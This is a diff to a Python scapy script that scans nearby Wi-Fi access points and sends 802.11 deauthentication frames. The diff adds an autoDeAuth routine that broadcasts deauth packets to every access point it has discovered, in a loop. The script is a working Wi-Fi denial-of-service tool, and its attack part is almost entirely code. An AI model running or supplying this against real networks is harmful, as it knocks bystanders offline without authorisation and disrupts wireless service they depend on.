@@ -1,6 +1,7 @@
 from operator import ne
 import sys, os, signal,json
 from multiprocessing import Process
+from itsdangerous import exc
 from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeResp,Dot11Elt, RadioTap, sendp, Dot11Deauth
 from scapy.all import *
 
@@ -32,10 +33,11 @@ class Network:
         self.target = ""
         self.rssList = []
         self.attackAP = []
-    def updateApList(self, p):
-        self.hopStart(p)
-        sniff(iface=self.interface, prn=self.sniffAP, timeout=20)
-        self.hopStop(p)
+        self.processList = []
+    def updateApList(self):
+        self.hopStart()
+        sniff(iface=self.interface, prn=self.sniffAP, timeout=10)
+        self.hopStop()
 
     def getApList(self):
         ls = []
@@ -73,11 +75,15 @@ class Network:
     def setChannel(self, channel):
         exe = "iw dev %s set channel %d" % (self.interface, channel)
         os.system(exe)
-    def hopStop(self, p):
-        p.terminate()
-        p.join()
-    def hopStart(self, p):
-        p.start()
+    def hopStop(self):
+        for pro in self.processList:
+            pro.terminate()
+            pro.join()
+        self.processList.clear()
+    def hopStart(self):
+        tmpProcess = Process(target = channel_hopper)
+        tmpProcess.start()
+        self.processList.append(tmpProcess)
     def sniffAP(self, pkt):
         if( (pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)) and not pkt[Dot11].addr3 in self.aps.keys()):
             ssid       = pkt[Dot11Elt].info
@@ -95,24 +101,40 @@ class Network:
 
             # Display discovered AP    
             print ("%02d  %s  %s %s" % (int(channel), enc, bssid, ssid))
-    def deAuth(self, stationAdr, apAdr, channel):
-        #write down u are code
+    def deAuth(self, apAdr, channel):
         self.setChannel(channel)
         ap = apAdr
         client = "FF:FF:FF:FF:FF:FF"
         pkt = RadioTap() / Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
-        sendp(pkt, iface=self.interface, inter=0.100, loop=1, count=100)
+        sendp(pkt, iface=self.interface, inter=0.100, loop=1, count=50)
+
+    def autoDeAuth(self):
+            time.sleep(1)
+            print(self.attackAP)
+            print("thread:",id(self.attackAP))
+            for i in self.aps:
+                try:
+                    pkt = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=i.bssid, addr3=i.bssid) / Dot11Deauth()
+                    print(i, "Send Deauth Packet")
+                    sendp(pkt, iface=self.interface, inter=0.1, loop=1, count=30)
+                except:
+                    continue
 
 if __name__ == "__main__":
 
 
     # Start the channel hopper
-    p = Process(target = channel_hopper)
+
     network = Network("wlan0mon")
-    print("set channel")
+    #print("set channel")
+    network.hopStart()
+    time.sleep(4)
+    network.hopStop()
+
+    network.hopStart()
     #print("dar", network.getPowerData("fc:7f:f1:b0:55:80", 6))
 #    network.getPowerData("fc:7f:f1:ae:80:e0", 11)
-    network.deAuth("FF:FF:FF:FF:FF:FF", "90:9f:33:1b:13:aa", 1)
+    #network.deAuth("FF:FF:FF:FF:FF:FF", "90:9f:33:1b:13:aa", 1)
     #network.deAuth("FF:FF:FF:FF:FF:FF", "FF:FF:FF:FF:FF:FF", 1)
     #network.deAuth("08:AE:D6:01:98:5F", "90:9f:33:1b:13:aa", 1)
     #network.updateApList(p)
